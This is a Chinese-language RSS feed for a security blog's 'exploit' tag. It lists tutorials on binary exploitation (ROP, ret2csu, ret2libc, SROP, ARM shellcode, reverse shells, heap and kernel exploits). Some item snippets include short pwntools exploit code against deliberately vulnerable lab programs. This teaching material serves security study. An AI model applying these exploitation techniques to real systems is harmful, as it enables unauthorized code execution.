<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>exploit on 诚安</title>
    <link>https://winsun.github.io/fightsec/tags/exploit/</link>
    <description>Recent content in exploit on 诚安</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Sun, 19 Feb 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://winsun.github.io/fightsec/tags/exploit/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ret2csu</title>
      <link>https://winsun.github.io/fightsec/post/pwn_09_ret2csu/</link>
      <pubDate>Sun, 19 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_09_ret2csu/</guid>
      <description>漏洞程序 #include &amp;lt;stdio.h&amp;gt; int win(int x, int y, int z) { if(z == 0xdeadbeefcafed00d) { puts(&amp;quot;Awesome work!&amp;quot;); } } int main() { puts(&amp;quot;Come on then, ret2csu me&amp;quot;); char input[30]; gets(input); return 0; } 利用分析 常规利用 溢出控制rip指向gadget gadget负责执行win 利用代码： from pwn import * elf = context.binary = ELF(&#39;./vuln&#39;) p = process() log.info(f&#39;win addr is : {hex(elf.sym.win)}&#39;) offset = 40 rop = ROP(elf) rop.raw(offset * &#39;a&#39;) rop.win(0,0,0xdeadbeefcafed00d) p.recv() p.sendline(rop.chain()) result = p.recvline() log.info(result) 上述代码基于一个假设存在可以构建gadget的情况，但实际情</description>
    </item>
    
    <item>
      <title>ret2dlresolve</title>
      <link>https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/</guid>
      <description>概要 利用ret2dlresolve，攻击者可以诱导二进制程序解析一个所选择的函数(比如system)为plt。 动态链接的ELF对象在第一次使用PLT和GOT调用时导入libc函数。在重定位runtime symbol，RIP将跳转到PLT并尝试解析该符号。在这个过程中，一个&amp;quo</description>
    </item>
    
    <item>
      <title>SROP</title>
      <link>https://winsun.github.io/fightsec/post/pwn_06_srop/</link>
      <pubDate>Sat, 11 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_06_srop/</guid>
      <description>SROP Sigreturn Oriented Programming (SROP), a novel technique for exploits and backdoors in UNIX-like systems. 具体见[1]。 漏洞程序 vuln程序 from pwn import * context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; elf = ELF.from_assembly( &#39;&#39;&#39; mov rdi, 0; mov rsi, rsp; sub rsi, 8; mov rdx, 500; syscall; ret; pop rax; ret; &#39;&#39;&#39;, vma=0x41000 ) elf.save(&#39;vuln&#39;) └─$ cat /usr/include/asm/unistd_64.h | grep -i sigreturn -A2 #define __NR_rt_sigreturn 15 #define __NR_ioctl 16 #define __NR_pread64 17 嵌入shell地址 ┌──(kali㉿kali)-[~/exploits/srop] └─$ echo -en &amp;quot;/bin/sh\x00&amp;quot; &amp;gt;&amp;gt; vuln ┌──(k</description>
    </item>
    
    <item>
      <title>ROP</title>
      <link>https://winsun.github.io/fightsec/post/pwn_02_rop/</link>
      <pubDate>Fri, 10 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_02_rop/</guid>
      <description>ROP Returned-oriented Program,defeats the W⊕X protections recently deployed by Microsoft,Intel, and AMD;in this context, it can be seen as a generalization of traditional return-into-libc attacks. But the threat is more general . gadget what gadget Each gadget is an arrangement of words on the stack, both pointers to instruction sequences and immediate data words, that when invoked accomplishes some well-defined task “W⊕X,” ensures that no memory location in a process image is marked both writable (“W”) and executable (“X”) gadget feature One gadget might: perform a load operation another an xor and another a conditional branch 案例程序 from pwn import * context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; elf = ELF.from_assembly( &#39;&#39;&#39; mov rdi, 0; mov rsi, rsp; sub rsi, 8; mov rdx,</description>
    </item>
    
    <item>
      <title>ret2libc</title>
      <link>https://winsun.github.io/fightsec/post/pwn_04_ret2libc/</link>
      <pubDate>Fri, 27 Jan 2023 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_04_ret2libc/</guid>
      <description>ret2libc 程序开启nx保护时候，传统的shellcode在栈上不可执行，无法获取 执行shell程序，可以用ret2libc技术。 漏洞程序 #include &amp;lt;stdio.h&amp;gt; void vuln() { char buffer[64]; puts(&amp;quot;Overflow me&amp;quot;); gets(buffer); } int main() { vuln(); } gcc vuln.c -o -m32 -fno-stack-protector -no-pie vuln-32 └─$ checksec --file=./vuln-32 [*] &#39;/home/kali/exploits/ret2libc/vuln-32&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 利用方案 eip直接指向system(&#39;/bin/sh&#39;) 确定</description>
    </item>
    
    <item>
      <title>ios内核堆梳理</title>
      <link>https://winsun.github.io/fightsec/post/arm_20_grooming_ios_kernel_heap/</link>
      <pubDate>Fri, 24 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_20_grooming_ios_kernel_heap/</guid>
      <description></description>
    </item>
    
    <item>
      <title>ios kernel和堆溢出</title>
      <link>https://winsun.github.io/fightsec/post/arm_19_ios_kernel_heap_overflow/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_19_ios_kernel_heap_overflow/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 堆溢出</title>
      <link>https://winsun.github.io/fightsec/post/arm_18_heap_overflow_dev/</link>
      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_18_heap_overflow_dev/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm glibc heap free</title>
      <link>https://winsun.github.io/fightsec/post/arm_17_glibc_heap_free/</link>
      <pubDate>Fri, 03 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_17_glibc_heap_free/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm glibc heap malloc</title>
      <link>https://winsun.github.io/fightsec/post/arm_16_glibc_heap_malloc/</link>
      <pubDate>Wed, 25 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_16_glibc_heap_malloc/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm shellcode 持久化</title>
      <link>https://winsun.github.io/fightsec/post/arm_15_process_continue_shellcode/</link>
      <pubDate>Fri, 20 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_15_process_continue_shellcode/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 栈溢出挑战</title>
      <link>https://winsun.github.io/fightsec/post/arm_14_stack_overflow_chg/</link>
      <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_14_stack_overflow_chg/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 栈溢出</title>
      <link>https://winsun.github.io/fightsec/post/arm_13_rop/</link>
      <pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_13_rop/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 栈溢出</title>
      <link>https://winsun.github.io/fightsec/post/arm_12_stack_overflow/</link>
      <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_12_stack_overflow/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 进程内存及崩溃分析</title>
      <link>https://winsun.github.io/fightsec/post/arm_11_procee_memory/</link>
      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_11_procee_memory/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm tcp反弹shell</title>
      <link>https://winsun.github.io/fightsec/post/arm_10_reverse_shell/</link>
      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_10_reverse_shell/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm tcp绑定shell</title>
      <link>https://winsun.github.io/fightsec/post/arm_09_tcp_bind_shell/</link>
      <pubDate>Thu, 15 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_09_tcp_bind_shell/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 堆栈和函数</title>
      <link>https://winsun.github.io/fightsec/post/arm_07_stack_function/</link>
      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_07_stack_function/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm shellcode编写</title>
      <link>https://winsun.github.io/fightsec/post/arm_08_shellcode/</link>
      <pubDate>Sat, 10 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_08_shellcode/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 条件执行和分支指令</title>
      <link>https://winsun.github.io/fightsec/post/arm_06_condition_branch/</link>
      <pubDate>Wed, 07 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_06_condition_branch/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 多次加载和存储</title>
      <link>https://winsun.github.io/fightsec/post/arm_05_load_store/</link>
      <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_05_load_store/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm 加载和存储指令</title>
      <link>https://winsun.github.io/fightsec/post/arm_04_mem_ins/</link>
      <pubDate>Sun, 27 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_04_mem_ins/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm指令集</title>
      <link>https://winsun.github.io/fightsec/post/arm_03_ins_set/</link>
      <pubDate>Wed, 23 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_03_ins_set/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm数据类型和寄存器</title>
      <link>https://winsun.github.io/fightsec/post/arm_02_data_reg/</link>
      <pubDate>Wed, 23 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_02_data_reg/</guid>
      <description></description>
    </item>
    
    <item>
      <title>arm汇编</title>
      <link>https://winsun.github.io/fightsec/post/arm_01_asm/</link>
      <pubDate>Sun, 20 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/arm_01_asm/</guid>
      <description></description>
    </item>
    
    <item>
      <title>unlink exploit</title>
      <link>https://winsun.github.io/fightsec/post/pwn_14_unlinkexp/</link>
      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_14_unlinkexp/</guid>
      <description></description>
    </item>
    
    <item>
      <title>double free</title>
      <link>https://winsun.github.io/fightsec/post/pwn_13_doublefree/</link>
      <pubDate>Mon, 14 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_13_doublefree/</guid>
      <description></description>
    </item>
    
    <item>
      <title>stack pivoiting</title>
      <link>https://winsun.github.io/fightsec/post/pwn_10_stack_pivoiting/</link>
      <pubDate>Sat, 29 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_10_stack_pivoiting/</guid>
      <description>1 what stack pivoiting是一种栈空间转移技术 2 why 有时候缓冲区有长度限制，不利于在栈上配置rop gadget(空间不够)！ 3 how 3.1 pop rsp gadget 这种情形比较少见，遇到了相当幸运～ 3.2 xchg , rsp pop &amp;lt;reg&amp;gt; &amp;lt;=== return pointer &amp;lt;reg value&amp;gt; xchg &amp;lt;rag&amp;gt;, rsp 3.3 leave;ret leave相当于： mov rsp,rbp pop rbp 加上ret就等于： mov rsp,rbp pop rbp pop rip 覆盖rbp，然后栈中的ri</description>
    </item>
    
    <item>
      <title>ret2reg</title>
      <link>https://winsun.github.io/fightsec/post/pwn_08_ret2reg/</link>
      <pubDate>Wed, 19 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_08_ret2reg/</guid>
      <description></description>
    </item>
    
    <item>
      <title>pwntools基本用法</title>
      <link>https://winsun.github.io/fightsec/post/pwn_01_pwntools/</link>
      <pubDate>Mon, 19 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_01_pwntools/</guid>
      <description>elf process remote rop 参考 pwntools github pwntools doc Writing Exploits with pwntools</description>
    </item>
    
    <item>
      <title>Linux Kernel Exploitation Technique: Overwriting: modprobe_path</title>
      <link>https://winsun.github.io/fightsec/post/pwn_23_exp_kernel/</link>
      <pubDate>Fri, 12 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://winsun.github.io/fightsec/post/pwn_23_exp_kernel/</guid>
      <description>引用 Overwriting modprobe_path Linux Kernel Exploitation</description>
    </item>
    
  </channel>
</rss>
